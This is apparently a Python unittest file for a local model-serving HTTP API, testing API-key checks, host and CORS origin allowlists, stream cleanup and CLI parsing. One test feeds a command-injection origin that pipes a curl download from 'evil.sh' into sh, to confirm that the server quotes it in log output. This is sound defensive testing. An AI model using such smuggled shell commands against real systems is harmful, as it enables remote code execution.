import concurrent.futures
import http.client
import io
import json
import os
import time
import unittest
from unittest import mock
from xml.etree import ElementTree

from openai import AuthenticationError, OpenAI

from dev.tests.server_fixtures import FakeRuntime, Harness, Plan
from install import launcher
from server import http_security, server
from server.origins import ANY_ORIGIN

# The launcher's parser and the server's, each with the arguments it requires.
PARSERS = (
    (launcher.parse_args, ["serve", "--model", "owner/repo"]),
    (
        server.parse_args,
        ["model", "--tokenizer", "tokenizer", "--model", "owner/repo"],
    ),
)


class ServerAccessTests(unittest.TestCase):
    def test_wildcard_listener_keeps_host_and_api_key_validation(self):
        harness = self.harness(
            host="0.0.0.0", allowed_hosts=("splash.local",), api_key="test-server-key"
        )
        self.assertEqual(harness.server.server_address[0], "0.0.0.0")
        port = harness.server.server_address[1]
        for host, key, expected in (
            (f"127.0.0.1:{port}", "test-server-key", 200),
            (f"127.0.0.1:{port}", "wrong", 401),
            (f"splash.local:{port}", "test-server-key", 200),
            (f"unknown.example:{port}", "test-server-key", 403),
        ):
            with self.subTest(host=host, expected=expected):
                connection = http.client.HTTPConnection("127.0.0.1", port, timeout=3)
                try:
                    connection.request(
                        "GET",
                        "/v1/models",
                        headers={
                            "Host": host,
                            "Authorization": f"Bearer {key}",
                        },
                    )
                    response = connection.getresponse()
                    self.assertEqual(response.status, expected, response.read())
                finally:
                    connection.close()

    def test_authenticated_streams_and_disconnect_cleanup(self):
        paths = (
            (
                "/v1/chat/completions",
                {"messages": [{"role": "user", "content": "hello"}]},
            ),
            ("/v1/responses", {"input": "hello"}),
            (
                "/v1/messages",
                {"messages": [{"role": "user", "content": "hello"}], "max_tokens": 16},
            ),
        )
        for path, fields in paths:
            with self.subTest(path=path):
                blocked = Plan(block=True)
                runtime = FakeRuntime(Plan([[1, 2, 3]]), blocked, Plan([[1, 2, 3]]))
                harness = Harness(runtime, api_key="test-server-key")
                self.addCleanup(harness.close)
                headers = {
                    "Content-Type": "application/json",
                    "Authorization": "Bearer test-server-key",
                }
                body = {"model": "test-model", "stream": True, **fields}
                status, content_type, data = harness.request(
                    "POST", path, body, headers
                )
                self.assertEqual(status, 200, data)
                self.assertTrue(content_type.startswith("text/event-stream"))
                self.assertIn(b"answer", data)
                self.assertNotIn(b"test-server-key", data)
                connection = http.client.HTTPConnection(
                    *harness.server.server_address, timeout=3
                )
                connection.request("POST", path, json.dumps(body), headers)
                response = connection.getresponse()
                self.assertEqual(response.status, 200)
                response.close()
                connection.close()
                self.assertTrue(
                    blocked.cancelled.wait(2),
                    "stream disconnect did not cancel generation",
                )
                deadline = time.monotonic() + 2
                while (
                    harness.server.requests.stats()["active"]
                    and time.monotonic() < deadline
                ):
                    time.sleep(0.005)
                self.assertEqual(harness.server.requests.stats()["active"], 0)
                self.assertEqual(harness.request("POST", path, body, headers)[0], 200)

    def test_openai_sdk_recognizes_auth_errors_and_recovers_with_valid_key(self):
        harness = self.harness(api_key="test-server-key")
        base_url = "http://%s:%s/v1" % harness.server.server_address
        with OpenAI(base_url=base_url, api_key="incorrect", max_retries=0) as client:
            with self.assertRaises(AuthenticationError):
                client.models.list()
        with OpenAI(
            base_url=base_url, api_key="test-server-key", max_retries=0
        ) as client:
            self.assertEqual(client.models.list().data[0].id, "test-model")

    def test_concurrent_clients_do_not_share_authentication_state(self):
        harness = self.harness(api_key="test-server-key")

        def query(index):
            authorized = index % 3 != 0
            key = "test-server-key" if authorized else "incorrect"
            status, _, _ = harness.request(
                "GET", "/v1/models", headers={"Authorization": f"Bearer {key}"}
            )
            return status, 200 if authorized else 401

        with concurrent.futures.ThreadPoolExecutor(max_workers=8) as pool:
            for actual, expected in pool.map(query, range(64)):
                self.assertEqual(actual, expected)
        self.assertTrue(harness.server.connections.idle.wait(2))
        self.assertFalse(harness.backend.runtime.requests)

    def test_authenticated_generation_uses_all_three_protocols(self):
        runtime = FakeRuntime(*(Plan([[1, 2, 3]]) for _ in range(3)))
        harness = Harness(runtime, api_key="test-server-key")
        self.addCleanup(harness.close)
        messages = [{"role": "user", "content": "hello"}]
        for path, body in (
            ("/v1/chat/completions", {"messages": messages}),
            ("/v1/responses", {"input": "hello"}),
            ("/v1/messages", {"messages": messages, "max_tokens": 16}),
        ):
            with self.subTest(path=path):
                status, _, data = harness.request(
                    "POST",
                    path,
                    {"model": "test-model", **body},
                    {
                        "Content-Type": "application/json",
                        "Authorization": "Bearer test-server-key",
                    },
                )
                self.assertEqual(status, 200, data)
                self.assertIn(b"answer", data)
        self.assertEqual(len(runtime.requests), 3)

    def harness(self, **kwargs):
        harness = Harness(FakeRuntime(), **kwargs)
        self.addCleanup(harness.close)
        return harness

    def test_a_page_of_an_allowed_origin_reads_every_response(self):
        runtime = FakeRuntime(Plan([[1, 2, 3]]), Plan([[1, 2, 3]]))
        harness = Harness(
            runtime, api_key="test-server-key", allowed_origins=("tauri://localhost",)
        )
        self.addCleanup(harness.close)
        origin = {"Origin": "tauri://localhost"}
        key = {
            "Authorization": "Bearer test-server-key",
            "Content-Type": "application/json",
        }
        body = {
            "model": "test-model",
            "messages": [{"role": "user", "content": "hello"}],
        }

        def exchange(method, headers, body=None, path="/v1/chat/completions"):
            connection = http.client.HTTPConnection(
                *harness.server.server_address, timeout=3
            )
            self.addCleanup(connection.close)
            data = None if body is None else json.dumps(body)
            connection.request(method, path, data, headers)
            response = connection.getresponse()
            return response.status, response.headers, response.read()

        # The preflight a browser sends before a request with a key or a JSON
        # body: without the key, for any header it asks about.
        status, headers, _ = exchange(
            "OPTIONS",
            {
                **origin,
                "Access-Control-Request-Method": "POST",
                "Access-Control-Request-Headers": "authorization, content-type",
            },
        )
        self.assertEqual(status, 204)
        self.assertEqual(
            [
                headers[name]
                for name in (
                    "Access-Control-Allow-Origin",
                    "Vary",
                    "Access-Control-Allow-Methods",
                    "Access-Control-Allow-Headers",
                    "Access-Control-Max-Age",
                )
            ],
            [
                "tauri://localhost",
                "Origin",
                "GET, HEAD, POST, DELETE, OPTIONS",
                "authorization, content-type",
                "600",
            ],
        )
        # An answer, a stream and a refusal alike name the origin, and let the
        # page read the retry and authentication hints.
        for sent, fields, expected in (
            ({**origin, **key}, {}, 200),
            ({**origin, **key}, {"stream": True}, 200),
            (origin, {}, 401),
        ):
            with self.subTest(fields=fields, expected=expected):
                status, headers, data = exchange("POST", sent, {**body, **fields})
                self.assertEqual(status, expected, data)
                self.assertEqual(
                    headers["Access-Control-Allow-Origin"], "tauri://localhost"
                )
                self.assertEqual(headers["Vary"], "Origin")
                self.assertEqual(
                    headers["Access-Control-Expose-Headers"],
                    "Retry-After, WWW-Authenticate",
                )
                if fields:
                    self.assertTrue(
                        headers["Content-Type"].startswith("text/event-stream")
                    )
        # A page of any other origin is refused before the request is read, a
        # preflight too, and learns nothing. The refusal names the flag, and
        # the server prints it once, as the browser hides it from the page.
        with mock.patch.object(http_security, "print_status") as printed:
            for method, extra in (
                ("POST", key),
                ("OPTIONS", {"Access-Control-Request-Method": "POST"}),
            ):
                with self.subTest(method=method):
                    status, headers, data = exchange(
                        method, {"Origin": "https://other.example", **extra}, body
                    )
                    self.assertEqual(status, 403)
                    self.assertIsNone(headers["Access-Control-Allow-Origin"])
                    self.assertIn(
                        "--allowed-origin https://other.example ",
                        json.loads(data)["error"]["message"],
                    )
        printed.assert_called_once_with(
            "Refused · Origin https://other.example · restart with "
            "--allowed-origin https://other.example to accept it",
            error=True,
        )
        # A client that is no page, and the server's own pages, get no such
        # headers.
        host = "%s:%s" % harness.server.server_address
        for sent in (key, {**key, "Origin": f"http://{host}"}):
            status, headers, _ = exchange("GET", sent, path="/v1/models")
            self.assertEqual(status, 200)
            self.assertIsNone(headers["Access-Control-Allow-Origin"])
            self.assertIsNone(headers["Access-Control-Expose-Headers"])
        self.assertEqual(len(runtime.requests), 2)

    def test_every_origin_is_admitted_when_asked(self):
        harness = self.harness(allowed_origins=("*",))
        for origin in ("https://anywhere.example", "null"):
            with self.subTest(origin=origin):
                connection = http.client.HTTPConnection(
                    *harness.server.server_address, timeout=3
                )
                self.addCleanup(connection.close)
                connection.request("GET", "/v1/models", headers={"Origin": origin})
                response = connection.getresponse()
                response.read()
                self.assertEqual(response.status, 200)
                self.assertEqual(response.headers["Access-Control-Allow-Origin"], "*")
                self.assertIsNone(response.headers["Vary"])
                self.assertEqual(
                    response.headers["Access-Control-Expose-Headers"],
                    "Retry-After, WWW-Authenticate",
                )

    def test_refused_origins_are_logged_once_each_and_bounded(self):
        log = http_security.RefusedOriginLog()
        origins = [f"https://{index}.example" for index in range(log.LIMIT + 5)]
        # An origin is printed cut to 256 characters, and a flag value a shell
        # would run quoted.
        origins[0] = "https://" + "a" * 300 + ".example"
        origins[1] = "http://jan.app$(curl${IFS}evil.sh|sh)"
        flags = [origins[0][:256], f"'{origins[1]}'", *origins[2:]]
        with mock.patch.object(http_security, "print_status") as printed:
            for origin in origins + origins:
                log.report(origin)
        self.assertEqual(
            printed.call_args_list,
            [
                mock.call(
                    f"Refused · Origin {origin[:256]} · restart with "
                    f"--allowed-origin {flag} to accept it",
                    error=True,
                )
                for origin, flag in zip(origins[: log.LIMIT], flags)
            ]
            + [mock.call("Refused · further Origins are not logged", error=True)],
        )

    def test_authentication_precedes_body_parsing_and_admission(self):
        harness = self.harness(api_key="test-server-key")
        for path in (
            "/v1/chat/completions",
            "/v1/responses",
            "/v1/messages",
            "/v1/messages/count_tokens?beta=true",
            "/tokenize",
            "/apply-template",
        ):
            with (
                self.subTest(path=path),
                mock.patch.object(server.FrontendHandler, "_read_json_body") as read,
            ):
                status, _, data = harness.request("POST", path)
                self.assertEqual(status, 401)
                self.assertNotIn("test-server-key", data.decode())
                read.assert_not_called()
                if path.startswith("/v1/messages"):
                    self.assertEqual(
                        json.loads(data)["error"]["type"], "authentication_error"
                    )

    def test_credentials_protect_control_and_history_routes(self):
        harness = self.harness(api_key="test-server-key")
        for method, path in (
            ("GET", "/status"),
            ("GET", "/metrics"),
            ("HEAD", "/v1/models"),
            ("GET", "/v1/responses/resp_missing"),
            ("DELETE", "/v1/responses/resp_missing"),
        ):
            with self.subTest(method=method, path=path):
                self.assertEqual(harness.request(method, path)[0], 401)
        for headers in (
            {"Authorization": "Bearer test-server-key"},
            {"Authorization": "bearer test-server-key"},
            {"x-api-key": "test-server-key"},
            # Anthropic's SDK with both an API key and an auth token.
            {"Authorization": "Bearer test-server-key", "x-api-key": "test-server-key"},
        ):
            self.assertEqual(
                harness.request("GET", "/v1/models", headers=headers)[0], 200
            )
        for headers in (
            {"Authorization": "Bearer incorrect"},
            {"Authorization": "Basic test-server-key"},
            {"Authorization": "Bearer incorrect", "x-api-key": "test-server-key"},
            {"Authorization": "Bearer test-server-key", "x-api-key": "incorrect"},
            {"Authorization": "Basic test-server-key", "x-api-key": "test-server-key"},
        ):
            self.assertEqual(
                harness.request("GET", "/v1/models", headers=headers)[0], 401
            )
        for name, value in (
            ("Authorization", "Bearer test-server-key"),
            ("x-api-key", "test-server-key"),
        ):
            connection = http.client.HTTPConnection(*harness.server.server_address)
            self.addCleanup(connection.close)
            connection.putrequest("GET", "/v1/models")
            connection.putheader(name, value)
            connection.putheader(name, value)
            connection.endheaders()
            response = connection.getresponse()
            response.read()
            self.assertEqual(response.status, 401)

    def test_routes_and_auth_use_one_normalized_path(self):
        harness = self.harness(api_key="test-server-key")
        key = {"Authorization": "Bearer test-server-key"}
        status, _, payload = harness.request("GET", "/./ready")
        self.assertEqual((status, json.loads(payload)), (200, {"status": "ready"}))
        status, _, payload = harness.request("GET", "/v1/models/../models", headers=key)
        self.assertEqual(status, 200)
        self.assertEqual(json.loads(payload)["object"], "list")
        self.assertEqual(harness.request("GET", "/v1/../status")[0], 401)
        self.assertEqual(harness.request("GET", "/v1/../status", headers=key)[0], 200)

    def test_public_probes_and_optional_webui(self):
        harness = self.harness(api_key="test-server-key", webui=False)
        for method in ("GET", "HEAD"):
            for path in ("/health", "/ready"):
                self.assertEqual(harness.request(method, path)[0], 200)
            for path in (
                "/",
                "/index.html?test=1",
                "/favicon.ico",
                *server.CHAT_ASSETS,
            ):
                self.assertEqual(harness.request(method, path)[0], 404)
        default = self.harness()
        self.assertEqual(default.request("GET", "/")[0], 200)
        self.assertEqual(default.request("GET", "/v1/models")[0], 200)
        protected = self.harness(api_key="test-server-key")
        status, _, html = protected.request("GET", "/")
        self.assertEqual(status, 200)
        self.assertNotIn(b"test-server-key", html)
        # The page's icon, which browsers fetch without the key.
        self.assertIn(
            b'<link rel="icon" href="/favicon.ico" type="image/svg+xml">', html
        )
        status, content_type, icon = protected.request("GET", "/favicon.ico")
        self.assertEqual((status, content_type), (200, "image/svg+xml"))
        self.assertTrue(ElementTree.fromstring(icon).tag.endswith("svg"))

    def test_chat_assets_are_public_but_do_not_expose_other_files(self):
        harness = self.harness(api_key="test-server-key")
        mimes = {".js": "text/javascript", ".css": "text/css"}
        for route in server.CHAT_ASSETS:
            with self.subTest(route=route):
                status, content_type, payload = harness.request("GET", route)
                self.assertEqual(status, 200)
                mime = mimes[os.path.splitext(route)[1]]
                self.assertEqual(content_type, f"{mime}; charset=utf-8")
                self.assertEqual(
                    payload, (server.ROOT / "server" / route[1:]).read_bytes()
                )
                self.assertEqual(harness.request("HEAD", route)[0], 200)
        key = {"Authorization": "Bearer test-server-key"}
        for path in ("/chat-assets/../server.py", "/chat-assets/missing.js"):
            self.assertEqual(harness.request("GET", path, headers=key)[0], 404)

    def test_cli_takes_origins_as_browsers_send_them(self):
        typed = ["tauri://localhost", "http://localhost:3000", "*"]
        flags = [flag for origin in typed for flag in ("--allowed-origin", origin)]
        parsed = [("tauri", "localhost", None), ("http", "localhost", 3000), ANY_ORIGIN]
        for parse, arguments in PARSERS:
            self.assertEqual(parse([*arguments, *flags]).allowed_origin, parsed)
            self.assertEqual(parse(arguments).allowed_origin, [])
            for origin, refusal in (
                ("http://localhost/app", "expected a scheme and a host"),
                ("tauri://*", "only a bare '*' admits every origin"),
            ):
                with (
                    self.subTest(origin=origin),
                    mock.patch("sys.stderr", io.StringIO()) as stderr,
                    self.assertRaises(SystemExit),
                ):
                    parse([*arguments, "--allowed-origin", origin])
                self.assertIn(
                    f"{origin} is not an origin: {refusal}", stderr.getvalue()
                )

    def test_cli_key_precedence_and_validation(self):
        for parse, arguments in PARSERS:
            with mock.patch.dict(os.environ, {"SPLASH_API_KEY": "environment-key"}):
                self.assertEqual(parse(arguments).api_key, "environment-key")
                args = parse([*arguments, "--api-key", "argument-key", "--no-webui"])
                self.assertEqual(args.api_key, "argument-key")
                self.assertTrue(args.no_webui)
            for key in ("", "two words", "key\n", "非ASCII"):
                with self.subTest(key=key), mock.patch("sys.stderr", io.StringIO()):
                    with self.assertRaises(SystemExit):
                        parse([*arguments, "--api-key", key])

    def test_launcher_uses_key_and_reports_auth_failure(self):
        harness = self.harness(api_key="test-server-key")
        port = harness.server.server_port
        with mock.patch.dict(os.environ, {"SPLASH_API_KEY": "test-server-key"}):
            self.assertIn("data", launcher._request_json("/v1/models", port=port))
        with mock.patch.dict(os.environ, {"SPLASH_API_KEY": "incorrect"}):
            with self.assertRaisesRegex(launcher.LauncherError, "SPLASH_API_KEY"):
                launcher._request_json("/v1/models", port=port)

    def test_unauthenticated_request_has_bearer_challenge(self):
        harness = self.harness(api_key="test-server-key")
        connection = http.client.HTTPConnection(*harness.server.server_address)
        self.addCleanup(connection.close)
        connection.request("GET", "/v1/models")
        response = connection.getresponse()
        self.assertEqual(response.status, 401)
        self.assertEqual(response.getheader("WWW-Authenticate"), "Bearer")
        response.read()
